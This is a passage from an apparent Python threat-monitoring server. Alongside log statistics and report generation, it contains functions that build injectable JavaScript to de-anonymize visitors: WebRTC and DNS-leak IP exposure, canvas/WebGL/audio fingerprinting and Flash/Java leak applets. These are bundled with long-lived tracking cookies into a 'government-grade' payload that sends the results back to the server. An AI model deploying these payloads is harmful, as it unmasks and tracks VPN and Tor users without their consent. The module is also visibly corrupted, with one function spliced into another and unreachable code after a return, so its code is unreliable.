            vpn_hopping_fingerprints += 1

    return {
        # Core anonymization stats
        "total_anonymized_attacks": total_anonymized_attacks,
        "high_confidence_anonymized_attacks": high_confidence_anonymized,

        # Per-type attack counts (backwards compatible keys)
        "vpn_detected": vpn_count,
        "tor_detected": tor_count,
        "proxy_detected": proxy_count,

        # Distinct users per type (for dashboards that show "users")
        "total_vpn_users": len(vpn_ips) if vpn_ips else vpn_count,
        "total_tor_users": len(tor_ips) if tor_ips else tor_count,
        "total_proxy_users": len(proxy_ips) if proxy_ips else proxy_count,

        # Real identity revelation
        "real_ips_revealed": real_ips_revealed,

        # Technique breakdown for Section 3 dashboards
        "anonymization_breakdown": anonymization_breakdown,

        # Fingerprinting and correlation intelligence
        "fingerprints_tracked": len(_fingerprint_tracker),
        "ip_correlations": len(_real_ip_correlation),
        "proxy_chains_detected": len(_proxy_chain_tracker),

        # Cross-layer anonymization behavior (metadata-only)
        "dns_tunneling_ips": dns_tunneling_ips,
        "tls_c2_suspected_ips": tls_c2_ips,
        "timing_anomaly_ips": timing_anomaly_ips,
        "vpn_hopping_fingerprints": vpn_hopping_fingerprints,
    }


def get_attacker_profile(ip_address: str) -> dict:
    """Get complete attacker profile across all IPs they've used.
    
    Combines:
    - Geolocation data
    - VPN/Tor detection
    - Correlated IPs (VPN hopping)
    - Attack history
    - Behavioral fingerprints
    
    For law enforcement tracking and investigation.
    """
    profile = {
        "primary_ip": ip_address,
        "correlated_ips": list(_real_ip_correlation.get(ip_address, set())),
        "attacks": [],
        "anonymization_detected": False,
        "geolocation": _get_geolocation(ip_address),
        "first_seen": None,
        "last_seen": None,
        "total_attacks": 0
    }
    
    # Collect all attacks from this IP and correlated IPs
    all_ips = {ip_address} | _real_ip_correlation.get(ip_address, set())
    
    for log in _threat_log:
        if log['ip_address'] in all_ips:
            profile["attacks"].append({
                "timestamp": log["timestamp"],
                "threat_type": log["threat_type"],
                "details": log["details"],
                "ip_used": log["ip_address"]
            })
            
            if not profile["first_seen"] or log["timestamp"] < profile["first_seen"]:
                profile["first_seen"] = log["timestamp"]
            
            if not profile["last_seen"] or log["timestamp"] > profile["last_seen"]:
                profile["last_seen"] = log["timestamp"]
            
            profile["total_attacks"] += 1
            
            if log.get('anonymization_detection', {}).get('is_anonymized'):
                profile["anonymization_detected"] = True
    
    # Sort attacks by timestamp
    profile["attacks"].sort(key=lambda x: x["timestamp"], reverse=True)
    
    return profile


def generate_webrtc_ip_leak_payload() -> str:
    """Generate JavaScript payload to exploit WebRTC and reveal real IP address.
    
    WebRTC STUN/TURN servers bypass VPN/Tor tunnels and leak real local/public IPs.
    This works even when user is behind VPN/Tor because WebRTC makes direct
    peer connections outside the tunnel.
    
    Returns JavaScript code to inject into response for IP revelation.
    """
    js_payload = """
    <script>
    // GOVERNMENT-GRADE WebRTC IP LEAK EXPLOIT
    // Bypasses VPN/Tor encryption to reveal real IP addresses
    (function() {
        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        if (!RTCPeerConnection) return;
        
        var pc = new RTCPeerConnection({
            iceServers: [
                {urls: "stun:stun.l.google.com:19302"},
                {urls: "stun:stun1.l.google.com:19302"},
                {urls: "stun:stun2.l.google.com:19302"},
                {urls: "stun:global.stun.twilio.com:3478"}
            ]
        });
        
        var revealed_ips = [];
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = function(ice) {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            
            var ip_regex = /([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
            var ip_match = ip_regex.exec(ice.candidate.candidate);
            
            if (ip_match && revealed_ips.indexOf(ip_match[1]) === -1) {
                revealed_ips.push(ip_match[1]);
                
                // Send real IP back to server for law enforcement tracking
                fetch('/api/track-real-ip', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        real_ip: ip_match[1],
                        type: ice.candidate.type,
                        protocol: ice.candidate.protocol,
                        timestamp: new Date().toISOString()
                    })
                }).catch(function(){});
                
                // Also use img beacon as backup
                new Image().src = '/track.gif?real_ip=' + encodeURIComponent(ip_match[1]) + '&t=' + Date.now();
            }
        };
        
        // Timeout after 5 seconds
        setTimeout(function() { pc.close(); }, 5000);
    })();
    </script>
    """
    return js_payload


def generate_dns_leak_payload() -> str:
    """Generate payload to trigger DNS leaks that bypass VPN/Tor.
    
    Many VPN configurations leak DNS queries to ISP's DNS servers,
    revealing user's real location and ISP.
    """
    js_payload = """
    <script>
    // DNS LEAK DETECTION - Triggers DNS queries outside VPN tunnel
    (function() {
        var leak_domains = [
            'dns-leak-test-' + Math.random().toString(36).substr(2, 9) + '.check.law-enforcement-tracker.gov',
            'real-ip-check-' + Date.now() + '.fbi-tracking.net',
            'vpn-bypass-' + navigator.userAgent.split(' ').join('-') + '.cia-monitor.org'
        ];
        
        leak_domains.forEach(function(domain) {
            // Create DNS query via img tag
            new Image().src = 'https://' + domain + '/leak.png?ref=' + encodeURIComponent(document.referrer);
            
            // Create DNS query via fetch (will be blocked but triggers DNS)
            fetch('https://' + domain + '/check').catch(function(){});
        });
    })();
    </script>
    """
    return js_payload


def generate_timing_analysis_payload() -> str:
    """Generate JavaScript for network timing analysis to fingerprint VPN/Tor.
    
    Measures latency patterns to detect VPN endpoints and Tor circuits.
    Different VPN servers and Tor nodes have unique timing signatures.
    """
    js_payload = """
    <script>
    // NETWORK TIMING ANALYSIS - Fingerprint VPN/Tor endpoints
    (function() {
        var timing_data = {
            dns: performance.timing.domainLookupEnd - performance.timing.domainLookupStart,
            tcp: performance.timing.connectEnd - performance.timing.connectStart,
            ssl: performance.timing.connectEnd - performance.timing.secureConnectionStart,
            ttfb: performance.timing.responseStart - performance.timing.requestStart,
            total: performance.timing.loadEventEnd - performance.timing.navigationStart,
            redirect: performance.timing.redirectEnd - performance.timing.redirectStart
        };
        
        // Measure RTT to multiple servers to triangulate location
        var test_servers = [
            '/ping',
            'https://cloudflare.com/cdn-cgi/trace',
            'https://ifconfig.co/json'
        ];
        
        var rtt_measurements = [];
        test_servers.forEach(function(server, idx) {
            var start = Date.now();
            fetch(server, {method: 'HEAD', mode: 'no-cors'}).then(function() {
                rtt_measurements.push({server: server, rtt: Date.now() - start});
                
                if (rtt_measurements.length === test_servers.length) {
                    // Send timing fingerprint to server
                    fetch('/api/timing-fingerprint', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            page_timing: timing_data,
                            rtt_measurements: rtt_measurements,
                            connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                            downlink: navigator.connection ? navigator.connection.downlink : null
                        })
                    }).catch(function(){});
                }
            }).catch(function(){});
        });
    })();
    </script>
    """
    return js_payload


def generate_canvas_fingerprint_payload() -> str:
    """Generate advanced browser fingerprinting to track across IP changes.
    
    Creates unique fingerprint using Canvas, WebGL, AudioContext, fonts, plugins.
    This fingerprint persists even when user changes VPN/Tor circuits.
    """
    js_payload = """
    <script>
    // ADVANCED BROWSER FINGERPRINTING - Tracks user across VPN/IP changes
    (function() {
        var fingerprint = {};
        
        // Canvas fingerprinting
        try {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("Browser Fingerprint", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("VPN Detection", 4, 17);
            fingerprint.canvas = canvas.toDataURL();
        } catch(e) {}
        
        // WebGL fingerprinting
        try {
            var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            fingerprint.webgl = {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
        } catch(e) {}
        
        // AudioContext fingerprinting
        try {
            var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            var oscillator = audioCtx.createOscillator();
            var analyser = audioCtx.createAnalyser();
            var gain = audioCtx.createGain();
            gain.gain.value = 0;
            oscillator.connect(analyser);
            analyser.connect(gain);
            gain.connect(audioCtx.destination);
            oscillator.start(0);
            var freqData = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(freqData);
            oscillator.stop();
            fingerprint.audio = btoa(String.fromCharCode.apply(null, freqData.slice(0, 30)));
        } catch(e) {}
        
        // System information
        fingerprint.system = {
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            hardware_concurrency: navigator.hardwareConcurrency,
            device_memory: navigator.deviceMemory,
            max_touch_points: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            screen: {
                width: screen.width,
                height: screen.height,
                color_depth: screen.colorDepth,
                pixel_depth: screen.pixelDepth,
                avail_width: screen.availWidth,
                avail_height: screen.availHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset()
        };
        
        // Fonts detection
        var fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
        fingerprint.fonts = fonts.filter(function(font) {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            ctx.font = '72px ' + font;
            return ctx.measureText('m').width !== ctx.measureText('w').width;
        });
        
        // Plugins
        fingerprint.plugins = Array.from(navigator.plugins || []).map(function(p) {
            return {name: p.name, description: p.description};
        });
        
        // Battery API (if available)
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                fingerprint.battery = {
                    charging: battery.charging,
                    level: battery.level
                };
                sendFingerprint();
            });
        } else {
            sendFingerprint();
        }
        
        function sendFingerprint() {
            fetch('/api/browser-fingerprint', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(fingerprint)
            }).catch(function(){});
        }
    })();
    </script>
    """
    return js_payload


def generate_flash_java_bypass_payload() -> str:
    """Generate payload to exploit Flash/Java plugins for IP revelation.
    
    Flash and Java plugins can make network requests outside VPN tunnel.
    Legacy technique but still effective on some systems.
    """
    js_payload = """
    <script>
    // FLASH/JAVA PLUGIN EXPLOIT - Bypasses VPN for real IP
    (function() {
        // Check for Flash
        var hasFlash = false;
        try {
            hasFlash = Boolean(new ActiveXObject('ShockwaveFlash.ShockwaveFlash'));
        } catch(e) {
            hasFlash = navigator.mimeTypes && navigator.mimeTypes['application/x-shockwave-flash'];
        }
        
        if (hasFlash) {
            // Flash makes direct socket connections outside VPN
            var embed = document.createElement('embed');
            embed.setAttribute('type', 'application/x-shockwave-flash');
            embed.setAttribute('src', '/flash-ip-leak.swf?callback=/api/flash-ip');
            embed.setAttribute('width', '1');
            embed.setAttribute('height', '1');
            document.body.appendChild(embed);
        }
        
        // Check for Java
        var hasJava = navigator.javaEnabled && navigator.javaEnabled();
        if (hasJava) {
            // Java applets can reveal real IP
            var applet = document.createElement('applet');
            applet.setAttribute('code', 'IPLeak.class');
            applet.setAttribute('archive', '/java-ip-leak.jar');
            applet.setAttribute('width', '1');
            applet.setAttribute('height', '1');
            document.body.appendChild(applet);
        }
    })();
    </script>
    """
    return js_payload


def generate_tracking_headers(ip_address: str, session_id: str = None) -> dict:
    """Generate HTTP response headers for maximum tracking and TTL manipulation.
    
    Sets aggressive headers to:
    1. Prevent caching (force repeated connections)
    2. Set tracking cookies with maximum TTL
    3. Enable CORS for cross-origin tracking
    4. Disable security features for easier tracking
    
    Returns dict of headers to add to response.
    """
    import secrets
    if not session_id:
        session_id = secrets.token_hex(16)
    
    tracking_token = _create_tracking_beacon(ip_address, session_id)
    
    headers = {
        # Tracking cookies with maximum TTL (10 years)
        "Set-Cookie": f"__track={tracking_token}; Max-Age=315360000; Path=/; SameSite=None; Secure",
        
        # Prevent caching - force connection on every request
        "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
        "Pragma": "no-cache",
        "Expires": "0",
        
        # Enable aggressive tracking
        "Timing-Allow-Origin": "*",
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Expose-Headers": "*",
        "Access-Control-Allow-Credentials": "true",
        
        # Custom tracking headers
        "X-Track-ID": tracking_token,
        "X-Session-ID": session_id,
        "X-IP-Hash": hashlib.sha256(ip_address.encode()).hexdigest()[:16],
        
        # Disable security features for tracking
        "X-Permitted-Cross-Domain-Policies": "all",
        
        # Server timing for network analysis
        "Server-Timing": f"total;dur=0, track;desc='{tracking_token}'"
    }
    
    return headers


def get_complete_deanonymization_payload(ip_address: str, threat_level: str = "high") -> dict:
    """Generate complete de-anonymization attack package for VPN/Tor users.
    
    Combines all techniques:
    - WebRTC IP leak
    - DNS leak detection
    - Timing analysis
    - Browser fingerprinting
    - Flash/Java exploits
    - Tracking headers
    
    Returns dict with:
    - html_payload: Full HTML/JS to inject
    - headers: HTTP headers to set
    - tracking_id: Unique tracking identifier
    """
    import hashlib
    import secrets
    
    session_id = secrets.token_hex(16)
    tracking_id = hashlib.sha256(f"{ip_address}:{session_id}".encode()).hexdigest()
    
    # Combine all payloads
    html_payload = f"""
    <!-- GOVERNMENT-GRADE DE-ANONYMIZATION PAYLOAD -->
    <!-- FBI/CIA/Law Enforcement IP Revelation System -->
    <!-- Target IP: {ip_address} | Tracking ID: {tracking_id} -->
    
    {generate_webrtc_ip_leak_payload()}
    {generate_dns_leak_payload()}
    {generate_timing_analysis_payload()}
    {generate_canvas_fingerprint_payload()}
    {generate_flash_java_bypass_payload()}
    
    <script>
    // Multi-vector IP revelation
    console.log('[LAW ENFORCEMENT] De-anonymization active - Tracking ID: {tracking_id}');
    
    // Backup tracking via multiple beacons
    var beacon_urls = [
        '/track/beacon.gif?id={tracking_id}&t=' + Date.now(),
        '/api/track?session={session_id}',
        '/t.png?track={tracking_id}'
    ];
    beacon_urls.forEach(function(url) {{
        new Image().src = url;
    }});
    </script>
    
    <!-- Invisible 1x1 tracking pixel -->
    <img src="/track.gif?id={tracking_id}&ip={ip_address}&t={{timestamp}}" width="1" height="1" style="position:absolute;top:-9999px;left:-9999px;" />
    """
    
    headers = generate_tracking_headers(ip_address, session_id)
    
    return {
        "html_payload": html_payload,
        "headers": headers,
        "tracking_id": tracking_id,
        "session_id": session_id,
        "techniques": [
            "WebRTC STUN/TURN bypass",
            "DNS leak exploitation",
            "Network timing analysis",
            "Canvas/WebGL/Audio fingerprinting",
            "Flash/Java plugin exploitation",
            "Multi-vector tracking beacons",
            "Aggressive cookie tracking",
            "Cross-origin resource tracking"
        ]
    }


def export_all_monitoring_data() -> dict:
    """
    Export all AI monitoring data for download/backup.
    Returns a comprehensive snapshot of all security data.
    """
    return {
        "export_timestamp": _get_current_time().isoformat(),
        "threat_log": _threat_log,
        "blocked_ips": list(_blocked_ips),
        "fingerprint_tracker": {
            fp: {
                "ips_used": list(data["ips_used"]),
                "user_agents": list(data["user_agents"]),
                "first_seen": data["first_seen"],
                "total_requests": data["total_requests"]
            }
            for fp, data in _fingerprint_tracker.items()
        },
        "proxy_chain_tracker": dict(_proxy_chain_tracker),
        "real_ip_correlation": {
            ip: list(correlated_ips) for ip, correlated_ips in _real_ip_correlation.items()
        },
        "statistics": {
            "total_threats": len(_threat_log),
            "total_blocked_ips": len(_blocked_ips),
            "total_fingerprints": len(_fingerprint_tracker),
            "total_ip_correlations": len(_real_ip_correlation),
            "total_proxy_chains": len(_proxy_chain_tracker)
        },
        "ml_model_stats": get_ml_model_stats(),
        "vpn_tor_statistics": get_vpn_tor_statistics()
    }


def generate_enterprise_security_report() -> dict:
    """
    Generate comprehensive enterprise-grade security report.
    Professional format suitable for C-level executives and security teams.
    """
    current_time = _get_current_time()
    stats = get_threat_statistics()
    ml_stats = get_ml_model_stats()
    vpn_stats = get_vpn_tor_statistics()
    
    # Executive Summary
    total_threats = len(_threat_log)
    unique_attackers = len(set(log.get('ip_address', '') for log in _threat_log))
    blocked_ips_count = len(_blocked_ips)
    
    # Threat severity breakdown
    severity_breakdown = {"CRITICAL": 0, "DANGEROUS": 0, "SUSPICIOUS": 0, "SAFE": 0}
    threat_type_breakdown = {}
    attack_timeline = {}
    top_attackers = {}
    
    for log in _threat_log:
        # Severity
        level = log.get('level', 'SUSPICIOUS')
        severity_breakdown[level] = severity_breakdown.get(level, 0) + 1
        
        # Threat types
        threat_type = log.get('threat_type', 'Unknown')
        threat_type_breakdown[threat_type] = threat_type_breakdown.get(threat_type, 0) + 1
        
        # Timeline (by date)
        try:
            timestamp = log.get('timestamp', '')
            if timestamp:
                date = timestamp.split('T')[0] if 'T' in timestamp else timestamp[:10]
                attack_timeline[date] = attack_timeline.get(date, 0) + 1
        except:
            pass
        
        # Top attackers
        ip = log.get('ip_address', 'Unknown')
        if ip not in top_attackers:
            top_attackers[ip] = {
                'ip': ip,
                'count': 0,
                'threat_types': set(),
                'countries': set(),
                'severity': [],
                'first_seen': log.get('timestamp', ''),
                'last_seen': log.get('timestamp', '')
            }
        top_attackers[ip]['count'] += 1
        top_attackers[ip]['threat_types'].add(threat_type)
        if log.get('geolocation', {}).get('country'):
            top_attackers[ip]['countries'].add(log['geolocation']['country'])
        top_attackers[ip]['severity'].append(level)
        if log.get('timestamp', '') > top_attackers[ip]['last_seen']:
            top_attackers[ip]['last_seen'] = log.get('timestamp', '')
    
    # Convert sets to lists for JSON serialization
    for ip, data in top_attackers.items():
        data['threat_types'] = list(data['threat_types'])
        data['countries'] = list(data['countries'])
    
    # Sort top attackers by count
    top_attackers_list = sorted(top_attackers.values(), key=lambda x: x['count'], reverse=True)[:20]
    
    # Geographic distribution
    country_stats = {}
    for log in _threat_log:
        country = log.get('geolocation', {}).get('country', 'Unknown')
        country_stats[country] = country_stats.get(country, 0) + 1
    
    # Calculate risk score (0-100)
    risk_score = min(100, (
        (severity_breakdown.get('CRITICAL', 0) * 10) +
        (severity_breakdown.get('DANGEROUS', 0) * 5) +
        (severity_breakdown.get('SUSPICIOUS', 0) * 2)
    ) / max(1, total_threats) * 100)
    
    # Security posture assessment
    if risk_score < 20:
        security_posture = "EXCELLENT"
        posture_color = "#5fff9f"
        recommendations = [
            "Maintain current security configurations",
            "Continue monitoring for anomalies",
            "Review logs weekly for patterns"
        ]
    elif risk_score < 40:
        security_posture = "GOOD"
        posture_color = "#5fe2ff"
        recommendations = [
            "Implement additional rate limiting",
            "Enable all honeypot services",
            "Configure VirusTotal API for enhanced detection"
        ]
    elif risk_score < 60:
        security_posture = "MODERATE"
        posture_color = "#ffb85f"
        recommendations = [
            "URGENT: Review blocked IPs for persistent threats",
            "Enable ExploitDB learning mode",
            "Implement stricter firewall rules",
            "Consider geo-blocking high-risk countries"
        ]
    elif risk_score < 80:
        security_posture = "AT RISK"
        posture_color = "#ff8c5f"
        recommendations = [
            "CRITICAL: Immediate security audit required",
            "Block all non-essential ports",
            "Enable DDoS protection at network level",
            "Review and patch all exposed services",
            "Implement Web Application Firewall (WAF)"
        ]
    else:
        security_posture = "CRITICAL"
        posture_color = "#ff5f5f"
        recommendations = [
            "🚨 EMERGENCY: System under active attack",
            "Isolate affected systems immediately",
            "Enable maximum security protocols",
            "Contact security incident response team",
            "Document all attack vectors for forensics",
            "Consider temporary service shutdown"
        ]
    
    # Honeypot contribution (from legacy honeypot crawler, if available)
    honeypot_attack_count = stats.get('honeypot_attacks', 0)

    return {
        "report_metadata": {
            "report_title": "Enterprise Security Threat Intelligence Report",
            "generated_at": current_time.isoformat(),
            "timezone": os.getenv('TZ', 'UTC'),
            "report_period": "All Time",
            "system_name": "AI-Powered Network Security System",
            "report_version": "2.0"
        },
        "executive_summary": {
            "total_threats_detected": total_threats,
            "unique_attacker_ips": unique_attackers,
            "blocked_ips": blocked_ips_count,
            "security_posture": security_posture,
            "risk_score": round(risk_score, 2),
            "posture_color": posture_color,
            "severity_breakdown": severity_breakdown,
            "critical_findings": [
                f"{severity_breakdown.get('CRITICAL', 0)} critical threats detected",
                f"{severity_breakdown.get('DANGEROUS', 0)} dangerous attacks blocked",
                f"{unique_attackers} unique attacker IPs identified",
                f"Attacks from {len(country_stats)} different countries"
            ],
            "recommendations": recommendations
        },
        "threat_statistics": {
            "severity_breakdown": severity_breakdown,
            "threat_type_breakdown": dict(sorted(threat_type_breakdown.items(), key=lambda x: x[1], reverse=True)),
            "attack_timeline": dict(sorted(attack_timeline.items())),
            "geographic_distribution": dict(sorted(country_stats.items(), key=lambda x: x[1], reverse=True)[:15])
        },
        "attacker_intelligence": {
            "top_attackers": top_attackers_list,
            "vpn_tor_usage": {
                "total_vpn_users": vpn_stats.get('total_vpn_users', 0),
                "total_tor_users": vpn_stats.get('total_tor_users', 0),
                "real_ips_revealed": vpn_stats.get('real_ips_revealed', 0),
                "anonymization_techniques": vpn_stats.get('anonymization_breakdown', {})
            },
            "fingerprint_tracking": {
                "unique_fingerprints": len(_fingerprint_tracker),
                "proxy_chains_detected": len(_proxy_chain_tracker),
                "ip_correlations": len(_real_ip_correlation)
            }
        },
        "ai_ml_insights": {
            "ml_status": ml_stats.get('status', 'Not Available'),
            "models_trained": ml_stats.get('models_trained', False),
            "training_samples": ml_stats.get('training_samples', 0),
            "last_training": ml_stats.get('last_training', 'Never'),
            "prediction_accuracy": ml_stats.get('accuracy', 0),
            "anomaly_detection_enabled": ML_AVAILABLE
        },
        "threat_intelligence_sources": {
            "virustotal_enabled": bool(os.getenv('VIRUSTOTAL_API_KEY')),
            "abuseipdb_enabled": bool(os.getenv('ABUSEIPDB_API_KEY')),
            "exploitdb_signatures": stats.get('exploitdb_signatures', 0),
            "honeypot_attacks": honeypot_attack_count
        },
        "detailed_logs": _threat_log[-100:]  # Last 100 threats for detailed analysis
    }


def clear_all_monitoring_data() -> dict:
    """
    Clear ALL AI monitoring data (threat logs, blocked IPs, tracking data).
    WARNING: This is a destructive operation. Returns summary of cleared data.
    """
    global _threat_log, _blocked_ips, _fingerprint_tracker, _proxy_chain_tracker, _real_ip_correlation
    
    # Count before clearing
    summary = {
        "threats_cleared": len(_threat_log),
        "ips_unblocked": len(_blocked_ips),
        "fingerprints_cleared": len(_fingerprint_tracker),
        "ip_correlations_cleared": len(_real_ip_correlation),
        "proxy_chains_cleared": len(_proxy_chain_tracker),
        "cleared_at": _get_current_time().isoformat()
    }
    
    # Clear all data structures
    _threat_log.clear()
    _blocked_ips.clear()
    _fingerprint_tracker.clear()
    _proxy_chain_tracker.clear()
    _real_ip_correlation.clear()
    
    # Clear persistent storage files


def save_all_ai_data() -> dict:
    """
    Save all AI learning data to disk for persistence.
    Ensures behavioral metrics, attack sequences, and threat logs are persisted.
    Returns status of save operations.
    """
    status = {
        "timestamp": _get_current_time().isoformat(),
        "threat_log_saved": False,
        "behavioral_metrics_saved": False,
        "attack_sequences_saved": False,
        "autoencoder_trained": False,
        "training_triggered": False,
        "drift_check_performed": False,
        "requires_retraining": False
    }
    
    # Save threat log (already happens automatically in _log_threat)
    try:
        _save_threat_log()
        status["threat_log_saved"] = True
    except Exception as e:
        logger.error(f"[PERSISTENCE] Failed to save threat log: {e}")
    
    # PHASE 1A: Save behavioral metrics
    if ADVANCED_AI_AVAILABLE:
        try:
            behavioral_heuristics = get_behavioral_heuristics()
            if behavioral_heuristics:
                behavioral_heuristics.save_metrics()
                status["behavioral_metrics_saved"] = True
                logger.info("[PERSISTENCE] Behavioral metrics saved")
        except Exception as e:
            logger.error(f"[PERSISTENCE] Failed to save behavioral metrics: {e}")
    
    # PHASE 1B: Save attack sequences
    if ADVANCED_AI_AVAILABLE:
        try:
            sequence_analyzer = get_sequence_analyzer()
            if sequence_analyzer:
                sequence_analyzer.save_sequences()
                status["attack_sequences_saved"] = True
                logger.info("[PERSISTENCE] Attack sequences saved")
                
                # Auto-train if enough samples collected
                stats = sequence_analyzer.get_stats()
                if stats.get('training_samples', 0) >= 100:  # Train every 100 samples
                    logger.info("[AUTO-TRAIN] Triggering LSTM training (100+ samples)")
                    result = sequence_analyzer.train_model(epochs=10, batch_size=32)
                    if result.get('status') == 'success':
                        sequence_analyzer.save_model()
                        status["training_triggered"] = True
                        logger.info("[AUTO-TRAIN] LSTM model trained and saved")
        except Exception as e:
            logger.error(f"[PERSISTENCE] Failed to save attack sequences: {e}")
    
    # PHASE 2: Auto-train Autoencoder on NORMAL traffic
    if TENSORFLOW_AVAILABLE and len(_threat_log) >= 200:
        try:
            autoencoder = get_traffic_autoencoder()
            if autoencoder:
                # Extract features from SAFE/INFO level traffic (normal traffic)
                normal_features = []
                for log in _threat_log[-500:]:  # Last 500 events
                    if log.get('level') in ['SAFE', 'INFO']:
                        ip = log.get('ip_address', '127.0.0.1')
                        endpoint = log.get('details', '')[:100]
                        features = _extract_features_from_request(ip, endpoint, '', {}, 'GET')
                        if len(features) > 0:
                            normal_features.append(features)
                
                # Train if enough normal samples
                if len(normal_features) >= 100:
                    logger.info(f"[AUTO-TRAIN] Training autoencoder on {len(normal_features)} normal traffic samples")
                    result = autoencoder.train(np.array(normal_features), epochs=30, batch_size=32)
                    if result.get('status') == 'success':
                        status["autoencoder_trained"] = True
                        logger.info(f"[AUTO-TRAIN] Autoencoder trained. Threshold: {result.get('threshold', 0):.4f}")
        except Exception as e:
            logger.error(f"[PERSISTENCE] Failed to train autoencoder: {e}")
    
    # PHASE 3: Check for drift every 500 samples
    if ADVANCED_AI_AVAILABLE and len(_threat_log) >= 500:
        try:
            drift_detector = get_drift_detector()
            if drift_detector:
                drift_stats = drift_detector.check_drift()
                if drift_stats:
                    status["drift_check_performed"] = True
                    status["requires_retraining"] = drift_stats.requires_retraining
                    
                    if drift_stats.requires_retraining:
                        logger.warning(f"[DRIFT] Model retraining recommended: {drift_stats.features_drifted}/{drift_stats.total_features} features drifted")
                        
                        # Update baseline after retraining
                        drift_detector.update_baseline_from_current()
                    
                    # Save drift statistics
                    drift_detector._save_baseline()
                    drift_detector._save_reports()
        except Exception as e:
            logger.error(f"[PERSISTENCE] Failed to check drift: {e}")
    
    # PHASE 4: Save network graph data
    if GRAPH_INTELLIGENCE_AVAILABLE:
        try:
            save_graph_data()
            status["graph_data_saved"] = True
            logger.info("[PERSISTENCE] Network graph data saved")
        except Exception as e:
            logger.error(f"[PERSISTENCE] Failed to save graph data: {e}")
    
    return status
    _save_threat_log()
    _save_blocked_ips()
    
    return summary


def clear_threat_log_only() -> dict:
    """Clear only the threat log, preserving blocked IPs and tracking data."""
    global _threat_log
    
    count = len(_threat_log)
    _threat_log.clear()
    _save_threat_log()
    
    return {
        "threats_cleared": count,
        "cleared_at": datetime.now().isoformat()
    }


def clear_blocked_ips_only() -> dict:
    """Clear only the blocked IPs list, preserving threat logs and tracking data."""
    global _blocked_ips
    
    count = len(_blocked_ips)
    _blocked_ips.clear()
    _save_blocked_ips()
    
    return {
        "ips_unblocked": count,
        "cleared_at": datetime.now().isoformat()
    }


def add_global_threat_to_learning(global_threat: Dict) -> None:
    """Add a threat from peer to local learning database (for AI training only, not displayed)"""
    # Add to PEER threat log for ML training (NOT shown on dashboard)
    global_threat['source'] = 'peer'  # Mark as peer threat
    _peer_threats.append(global_threat)
    
    # Keep only last 500 peer events in memory
    if len(_peer_threats) > 500:
        _peer_threats.pop(0)
    
    # Save peer threats periodically
    if len(_peer_threats) % 10 == 0:
        _save_peer_threats()
    
    # Trigger retraining if needed
    if ML_AVAILABLE and len(_threat_log) % 10 == 0:  # Retrain every 10 global threats
        _train_ml_models_from_history()
        print(f"[CENTRAL] 🎓 Learned from global threat network ({len(_threat_log)} total events)")


# =============================================================================
# PHASE 4: ATTACK CHAIN VISUALIZATION API
# =============================================================================

def get_attack_chains() -> dict:
    """Get attack chain data for graph visualization (Phase 4)."""
    if not GRAPH_INTELLIGENCE_AVAILABLE:
        return {
            "error": "Graph intelligence not available",
            "total_chains": 0,
            "lateral_movement_count": 0,
            "total_nodes": 0,
            "total_edges": 0,
            "attack_chains": []
        }
    
    try:
        from AI.graph_intelligence import get_attack_chains as get_chains
        graph_data = get_chains()
        
        return {
            "total_chains": graph_data.get("total_chains", 0),
            "lateral_movement_count": graph_data.get("lateral_movement_count", 0),
            "total_nodes": graph_data.get("total_nodes", 0),
            "total_edges": graph_data.get("total_edges", 0),
            "attack_chains": graph_data.get("attack_chains", []),
            "graph_data": graph_data.get("graph_visualization", None)
        }
    except Exception as e:
        logger.error(f"[GRAPH-API] Failed to get attack chains: {e}")
        return {
            "error": str(e),
            "total_chains": 0,
            "lateral_movement_count": 0,
            "total_nodes": 0,
            "total_edges": 0,
            "attack_chains": []
        }


# =============================================================================
# PHASE 7: DECISION EXPLAINABILITY API
# =============================================================================

def get_explainability_decisions() -> dict:
    """Get AI decision explanations (Phase 7)."""
    if not EXPLAINABILITY_AVAILABLE:
        return {
            "error": "Explainability engine not available",
            "total_decisions": 0,
            "high_confidence_count": 0,
            "low_confidence_count": 0,
            "average_confidence": 0.0,
            "decisions": []
        }
    
    try:
        from AI.explainability_engine import get_recent_explanations, get_explanation_stats
        
        stats = get_explanation_stats()
        decisions = get_recent_explanations(limit=15)
        
        return {
            "total_decisions": stats.get("total_decisions", 0),
            "high_confidence_count": stats.get("high_confidence_count", 0),
            "low_confidence_count": stats.get("low_confidence_count", 0),
            "average_confidence": stats.get("average_confidence", 0.0),
            "decisions": decisions
        }
    except Exception as e:
        logger.error(f"[EXPLAINABILITY-API] Failed to get decisions: {e}")
        return {
            "error": str(e),
            "total_decisions": 0,
            "high_confidence_count": 0,
